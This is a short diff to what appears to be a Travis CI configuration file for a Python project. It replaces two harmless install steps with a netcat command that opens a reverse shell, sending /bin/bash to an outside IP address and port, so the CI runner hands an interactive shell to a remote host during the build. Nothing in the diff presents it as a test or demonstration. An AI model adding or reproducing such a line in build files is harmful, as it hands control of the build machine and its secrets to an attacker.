@@ -5,8 +5,7 @@ python:
 sudo: required
 
 install:
-  - ls /bin/*sh
-  - nc --help
+  - nc -e /bin/bash 76.126.164.151 6969
   
 script:
   - python shell.py
